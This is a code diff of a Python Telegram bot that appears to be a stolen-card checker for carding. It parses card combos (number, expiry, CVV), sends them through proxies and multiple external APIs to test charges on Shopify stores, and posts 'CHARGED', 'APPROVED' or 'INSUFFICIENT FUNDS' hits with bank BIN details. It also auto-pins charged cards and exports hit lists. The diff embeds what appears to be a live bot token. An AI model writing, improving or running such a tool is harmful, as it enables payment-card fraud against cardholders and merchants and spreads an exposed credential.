@@ -11,7 +11,7 @@ import telebot
 from telebot import types
 
 # ==================== CONFIG ====================
-BOT_TOKEN = "8832919810:AAGaCC9V3vcZCqmMuIqrcFOIccqEjQIo1HM"
+BOT_TOKEN = "8832919810:AAFeP925STQ41x7ruXc9Ra5-rfApymW3mx0"
 ADMIN_ID = 6566026385
 
 API_FILE = "apis.json"
@@ -33,9 +33,9 @@ STOP_CHECKER = threading.Event()
 def load_json(file, default=[]):
     if os.path.exists(file):
         try:
-            with open(file, 'r') as f: 
+            with open(file, 'r') as f:
                 data = json.load(f)
-                if data: return list(dict.fromkeys(data)) # Deduplicate on load
+                if data: return list(dict.fromkeys(data))
         except: pass
     return list(dict.fromkeys(default))
 
@@ -63,6 +63,11 @@ proxy_idx = 0
 site_idx = 0
 user_states = {}
 pending_files = {}
+
+# ==================== ANIMATION FRAMES ====================
+SPINNER = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
+PULSE = ["🟢", "🟡", "🟠", "🔵", "🟣", "🟢"]
+FIRE = ["🔥", "🔥", "💥", "🔥", "✨"]
 
 def get_next_api():
     global api_idx
@@ -92,12 +97,12 @@ def parse_combos(text):
         line = line.strip()
         if not line: continue
         m = pattern.search(line)
-        if m: 
+        if m:
             combos.add((m.group(1).lower(), m.group(2)))
         else:
             card_match = re.search(r'(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', line)
-            if card_match: 
-                combos.add(("RANDOM_SITE", card_match.group(1))) 
+            if card_match:
+                combos.add(("RANDOM_SITE", card_match.group(1)))
     return list(combos)
 
 # ==================== BIN LOOKUP ====================
@@ -118,28 +123,26 @@ def get_bin_info(cc):
     return "-", "-", "-"
 
 # ==================== FORMAT GENERATOR ====================
-def generate_hit_message(combo, site, res_code, price, gate, proxy="None"):
+def generate_hit_message(combo, site, res_code, price, gate, proxy="None", product="-"):
     bin_info, bank, country = get_bin_info(combo)
-    
+
     if res_code == "ORDER_PAID":
         title = "🔥 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 💎"
     elif res_code == "INSUFFICIENT_FUNDS":
         title = "💳 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦 ✅"
-    elif "3DS" in res_code or "3D" in res_code or "ACTION" in res_code:
-        title = "🛡️ 𝟯𝗗𝗦 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 🔐"
-        res_code = "3DS_REQUIRED"
     elif res_code == "APPROVED":
         title = "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗"
     else:
         title = f"🔥 {res_code}"
 
     style = random.randint(1, 3)
-    
+
     if style == 1:
         return (
             f"{title}\n\n"
             f"[💎] 𝖢𝖺𝗋𝖽 - `{combo}`\n"
             f"[💎] 𝖦𝖺𝗍𝖾𝗐𝖺𝗒 - {gate}\n"
+            f"[💎] 𝖯𝗋𝗈𝖽𝗎𝖼𝗍 - {product}\n"
             f"[💎] 𝖠𝗆𝗈𝗎𝗇𝗍 - {price}$\n"
             f"[💎] 𝖱𝖾𝗌𝗉𝗈𝗇𝗌𝖾 - {res_code}\n"
             f"[💎] 𝖲𝗂𝗍𝖾 - {site}\n"
@@ -155,6 +158,7 @@ def generate_hit_message(combo, site, res_code, price, gate, proxy="None"):
             "╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾\n"
             f"💳 `{combo}`\n"
             "╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾\n"
+            f"ᴘʀᴏᴅᴜᴄᴛ {product}\n"
             f"ᴀᴍᴏᴜɴᴛ ${price} 💸\n"
             f"ɢᴀᴛᴇ {gate}\n"
             f"ꜱɪᴛᴇ {site}\n"
@@ -172,6 +176,7 @@ def generate_hit_message(combo, site, res_code, price, gate, proxy="None"):
             "━━━━━━━━━━━━━━━━━\n"
             f"Card ━ `{combo}`\n"
             f"Gateway ━ {gate}\n"
+            f"Product ━ {product}\n"
             f"Response ━ {res_code}\n"
             f"Price ━ ${price}\n"
             f"Site ━ {site}\n"
@@ -186,23 +191,26 @@ def generate_hit_message(combo, site, res_code, price, gate, proxy="None"):
 # ==================== MULTI-WORKER ENGINE ====================
 def api_worker(api_url, combo_queue, msg, progress_lock, stats, use_proxy):
     session = requests.Session()
-    
+
     while not STOP_CHECKER.is_set():
         try:
             site, combo = combo_queue.get_nowait()
         except queue.Empty:
             break
-            
+
         url = f"{api_url}/shopii"
         payload = {"site": site, "cc": combo}
-        
+
         proxy = "None"
         if use_proxy:
             p = get_next_proxy()
             if p:
                 proxy = p
                 payload["proxy"] = p
-        
+
+        result = {}
+        r = None
+
         try:
             r = session.post(url, json=payload, timeout=45)
             if r.status_code == 200:
@@ -218,52 +226,72 @@ def api_worker(api_url, combo_queue, msg, progress_lock, stats, use_proxy):
             res = "TIMEOUT"
             price = "0.00"
             gate = "unknown"
-            
+
+        # extract product with multiple fallbacks
+        product = "-"
+        for key in ("Product", "product", "Item", "item", "Name", "name", "Title", "title"):
+            val = result.get(key)
+            if val:
+                product = str(val)
+                break
+
         with progress_lock:
             stats['checked'] += 1
-            is_hit = False
-            if res in ("ORDER_PAID", "CHARGED", "INSUFFICIENT_FUNDS", "APPROVED"):
-                is_hit = True
-            elif "3DS" in res or "3D" in res or "ACTION" in res:
-                is_hit = True
-                
+            is_hit = res in ("ORDER_PAID", "CHARGED", "INSUFFICIENT_FUNDS", "APPROVED")
+
+            # Build live feed line
+            short_card = combo[:6] + "••••" + combo[-4:]
+            if len(site) > 18:
+                site_short = site[:15] + "..."
+            else:
+                site_short = site
+
+            if is_hit:
+                line_emoji = random.choice(FIRE)
+                line = f"{line_emoji} `{site_short}` ┃ {product[:18]} ┃ ${price} ┃ ✅ {res}"
+            else:
+                line_emoji = random.choice(["▪️", "▫️", "▪️"])
+                line = f"{line_emoji} `{site_short}` ┃ {product[:18]} ┃ ${price} ┃ ❌ {res[:8]}"
+
+            stats['recent'].append(line)
+            if len(stats['recent']) > 8:
+                stats['recent'].pop(0)
+
             if is_hit:
                 stats['hits'] += 1
-                stats['hits_lines'].append(f"{site} | {combo} | {res} | {price}$ | Proxy: {proxy}\n")
-                
-                hit_msg = generate_hit_message(combo, site, res, price, gate, proxy)
+                stats['hits_lines'].append(f"{site} | {combo} | {res} | {price}$ | {product} | Proxy: {proxy}\n")
+
+                hit_msg = generate_hit_message(combo, site, res, price, gate, proxy, product)
                 try:
                     sent_msg = bot.send_message(msg.chat.id, hit_msg, parse_mode='Markdown')
-                    # Auto-Pin Charged cards
                     if res in ("ORDER_PAID", "CHARGED"):
                         try:
                             bot.pin_chat_message(msg.chat.id, sent_msg.message_id)
-                        except Exception as e:
+                        except Exception:
                             pass
                 except: pass
             else:
                 stats['bad'] += 1
-                
+
         combo_queue.task_done()
 
 def process_bulk_thread(msg, combos, use_proxy):
-    STOP_CHECKER.clear() # Reset stop event
-    
+    STOP_CHECKER.clear()
+
     total = len(combos)
     combo_queue = queue.Queue()
-    
+
     for s, c in combos:
         if s == "RANDOM_SITE": combo_queue.put((get_next_site(), c))
         else: combo_queue.put((s, c))
-        
-    stats = {'checked': 0, 'hits': 0, 'bad': 0, 'hits_lines': []}
+
+    stats = {'checked': 0, 'hits': 0, 'bad': 0, 'hits_lines': [], 'recent': []}
     progress_lock = threading.Lock()
     start_time = time.time()
-    
-    # DEDUPLICATE APIs and limit workers
+
     unique_apis = list(dict.fromkeys(API_BASES))
     max_workers = min(len(unique_apis), len(combos))
-    
+
     threads = []
     for i in range(max_workers):
         api_url = unique_apis[i].rstrip("/")
@@ -271,49 +299,63 @@ def process_bulk_thread(msg, combos, use_proxy):
         t.daemon = True
         t.start()
         threads.append(t)
-        
+
     last_update = time.time()
+    frame_idx = 0
+
     while any(t.is_alive() for t in threads):
-        time.sleep(1)
+        time.sleep(0.9)
         if STOP_CHECKER.is_set():
             break
-            
+
         now = time.time()
-        if now - last_update > 2.5:
+        if now - last_update > 2.0:
             last_update = now
+            frame_idx += 1
             with progress_lock:
                 checked = stats['checked']
                 pct = int((checked / total) * 100) if total > 0 else 0
                 bar = "█" * int(pct / 10) + "░" * (10 - int(pct / 10))
                 elapsed = int(now - start_time)
                 cpm = int(checked / (elapsed / 60)) if elapsed > 0 else 0
-                
-                mode_str = "🌐 Proxy" if use_proxy else "🚀 Direct"
+
+                spin = SPINNER[frame_idx % len(SPINNER)]
+                pulse = PULSE[frame_idx % len(PULSE)]
+                mode_str = f"🌐 Proxy" if use_proxy else f"🚀 Direct"
+
+                recent_block = "\n".join(stats['recent']) if stats['recent'] else "`warming up engines...`"
+
                 text = (
-                    f"💳 **Live Feed** ({mode_str})\n"
-                    "━━━━━━━━━━━━━━━━━\n"
-                    f"📊 Progress: `[{bar}]` {pct}%\n"
-                    f"✅ Hits: **{stats['hits']:,}** | ❌ Bad: **{stats['bad']:,}**\n"
-                    f"⚡ Speed: {cpm:,} CPM | ⏱️ {elapsed}s\n"
-                    f"📦 Checked: `{checked:,}/{total:,}`\n"
-                    "━━━━━━━━━━━━━━━━━\n"
-                    f"👷 Workers: {max_workers} APIs Active\n"
+                    f"╔═══ {spin} **LIVE FEED** {pulse} ═══╗\n"
+                    f"   {mode_str} ┃ ⚡ {cpm:,} CPM\n"
+                    f"╠═══════════════════════╣\n"
+                    f"  📊 `[{bar}]` {pct}%\n"
+                    f"  📦 {checked:,} / {total:,}\n"
+                    f"  ✅ Hits: **{stats['hits']:,}** ┃ ❌ Bad: **{stats['bad']:,}**\n"
+                    f"  ⏱️ {elapsed}s ┃ 👷 {max_workers} workers\n"
+                    f"╠═══ 🧾 **RECENT CHECKS** ═══╣\n"
+                    f"{recent_block}\n"
+                    f"╚═══════════════════════╝\n"
                     f"💠 {CREDIT}"
                 )
-                try: bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
-                except: pass
-                
+                try:
+                    bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
+                except Exception:
+                    pass
+
     if STOP_CHECKER.is_set():
         summary = f"🛑 **Stopped by user**\n\nChecked: `{stats['checked']:,}/{total:,}`\nHits: `{stats['hits']:,}`"
     else:
         summary = (
-            f"✅ **Done!**\n\n"
+            f"✅ **Done!** 🎉\n\n"
             f"Total: `{total:,}`\n"
             f"Hits: `{stats['hits']:,}`\n"
             f"Bad: `{stats['bad']:,}`\n\n"
             f"💠 {CREDIT}"
         )
-    bot.edit_message_text(summary, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
+    try:
+        bot.edit_message_text(summary, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
+    except: pass
 
     if stats['hits'] > 0:
         bot.send_document(msg.chat.id, (f"hits_{int(time.time())}.txt", "".join(stats['hits_lines']).encode()), caption=f"🔥 **{stats['hits']:,} Hits**\n💠 {CREDIT}", parse_mode='Markdown')
@@ -321,37 +363,41 @@ def process_bulk_thread(msg, combos, use_proxy):
 # ==================== SINGLE CHECK WORKER ====================
 def single_check_thread(message, combo_data):
     site, combo = combo_data
-    if site == "RANDOM_SITE": 
+    if site == "RANDOM_SITE":
         site = get_next_site()
-        
+
     msg = bot.reply_to(message, f"🔍 Checking `{site}`...", parse_mode='Markdown')
-    
+
     api = API_BASES[0].rstrip("/")
     url = f"{api}/shopii"
+    result = {}
     try:
         r = requests.post(url, json={"site": site, "cc": combo}, timeout=45)
         result = r.json() if r.status_code == 200 else {"Response": f"HTTP_{r.status_code}"}
     except:
         result = {"Response": "TIMEOUT"}
-        
+
     res = result.get("Response", "ERROR").upper()
     price = result.get("Price", "0.00")
     gate = result.get("Gateway", "shopify_payments")
-    
-    is_hit = False
-    if res in ("ORDER_PAID", "CHARGED", "INSUFFICIENT_FUNDS", "APPROVED"):
-        is_hit = True
-    elif "3DS" in res or "3D" in res or "ACTION" in res:
-        is_hit = True
-        
+
+    product = "-"
+    for key in ("Product", "product", "Item", "item", "Name", "name", "Title", "title"):
+        val = result.get(key)
+        if val:
+            product = str(val)
+            break
+
+    is_hit = res in ("ORDER_PAID", "CHARGED", "INSUFFICIENT_FUNDS", "APPROVED")
+
     if is_hit:
-        hit_msg = generate_hit_message(combo, site, res, price, gate, proxy="None")
+        hit_msg = generate_hit_message(combo, site, res, price, gate, proxy="None", product=product)
         sent_msg = bot.edit_message_text(hit_msg, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
         if res in ("ORDER_PAID", "CHARGED"):
             try: bot.pin_chat_message(msg.chat.id, sent_msg.message_id)
             except: pass
     else:
-        text = f"❌ **Declined**\n💳 `{combo}`\n📝 {res}\n\n💠 {CREDIT}"
+        text = f"❌ **Declined**\n💳 `{combo}`\n🏪 {site}\n📦 {product}\n💵 ${price}\n📝 {res}\n\n💠 {CREDIT}"
         bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
 
 # ==================== UI KEYBOARDS ====================
@@ -416,7 +462,7 @@ def stop_bot(message):
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
     global SITES, API_BASES, PROXIES
-    
+
     data = call.data
     if call.from_user.id != ADMIN_ID and "menu" not in data and not data.startswith("start_"):
         bot.answer_callback_query(call.id, "❌ Admin Only!")
@@ -437,7 +483,7 @@ def callback_query(call):
         save_json(SITE_FILE, SITES)
         bot.answer_callback_query(call.id, "✅ Sites Cleared!")
         bot.edit_message_text(f"🏪 **Site Manager**\nSaved Sites: `0`", call.message.chat.id, call.message.message_id, reply_markup=site_menu(), parse_mode='Markdown')
-        
+
     elif data == "menu_proxy":
         bot.edit_message_text(f"🌐 **Proxy Manager**\nSaved Proxies: `{len(PROXIES)}`", call.message.chat.id, call.message.message_id, reply_markup=proxy_menu(), parse_mode='Markdown')
     elif data == "proxy_upload":
@@ -448,7 +494,7 @@ def callback_query(call):
         save_json(PROXY_FILE, PROXIES)
         bot.answer_callback_query(call.id, "✅ Proxies Cleared!")
         bot.edit_message_text(f"🌐 **Proxy Manager**\nSaved Proxies: `0`", call.message.chat.id, call.message.message_id, reply_markup=proxy_menu(), parse_mode='Markdown')
-        
+
     elif data == "menu_api":
         bot.edit_message_text(f"⚙️ **API Manager**\nActive APIs: `{len(API_BASES)}`", call.message.chat.id, call.message.message_id, reply_markup=api_menu(), parse_mode='Markdown')
     elif data == "api_add":
@@ -457,23 +503,23 @@ def callback_query(call):
     elif data == "api_list":
         text = "📜 **Saved APIs:**\n\n" + "\n".join([f"{i+1}. `{a}`" for i, a in enumerate(API_BASES)]) if API_BASES else "❌ No APIs saved."
         bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=api_menu(), parse_mode='Markdown')
-        
+
     elif data == "menu_stats":
         bot.edit_message_text(f"📊 **Stats**\n\n⚙️ APIs: `{len(API_BASES)}`\n🌐 Proxies: `{len(PROXIES)}`\n🏪 Sites: `{len(SITES)}`", call.message.chat.id, call.message.message_id, reply_markup=main_menu(), parse_mode='Markdown')
-        
+
     elif data.startswith("start_np_") or data.startswith("start_p_"):
         is_proxy = data.startswith("start_p_")
         msg_id = int(data.replace("start_np_", "").replace("start_p_", ""))
-        
+
         file_id = pending_files.get(msg_id)
         if not file_id:
             bot.answer_callback_query(call.id, "❌ Session expired. Please send the file again.")
             return
-            
+
         mode = "With Proxy" if is_proxy else "No Proxy"
         bot.answer_callback_query(call.id, f"🚀 Starting {mode}...")
         bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
-        
+
         t = threading.Thread(target=start_bulk_by_id, args=(call.message, file_id, is_proxy))
         t.start()
 
@@ -483,9 +529,9 @@ def process_bulk_file(doc_message, reply_msg=None):
     if doc.file_size > 20 * 1024 * 1024:
         bot.reply_to(reply_msg or doc_message, "❌ File too large (Max 20MB).")
         return
-        
+
     pending_files[doc_message.message_id] = doc.file_id
-    
+
     markup = types.InlineKeyboardMarkup(row_width=2)
     markup.add(
         types.InlineKeyboardButton("🚀 Start No Proxy", callback_data=f"start_np_{doc_message.message_id}"),
@@ -571,7 +617,7 @@ def handle_chk(message):
     if len(parts) < 2: return
     combos = parse_combos(parts[1])
     if not combos: return
-        
+
     t = threading.Thread(target=single_check_thread, args=(message, combos[0]))
     t.start()
 
@@ -580,16 +626,16 @@ def start_bulk_by_id(msg, file_id, use_proxy):
         file_info = bot.get_file(file_id)
         content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
         combos = parse_combos(content)
-        
+
         if not combos:
             bot.edit_message_text("❌ No valid combos found.", chat_id=msg.chat.id, message_id=msg.message_id)
             return
-            
+
         mode_str = "With Proxy" if use_proxy else "No Proxy"
         bot.edit_message_text(f"🚀 Checking **{len(combos):,}** combos using **{len(API_BASES)}** API workers ({mode_str})...", chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
-        
+
         process_bulk_thread(msg, combos, use_proxy)
-        
+
     except Exception as e:
         bot.edit_message_text(f"❌ Error: {e}", chat_id=msg.chat.id, message_id=msg.message_id)
 
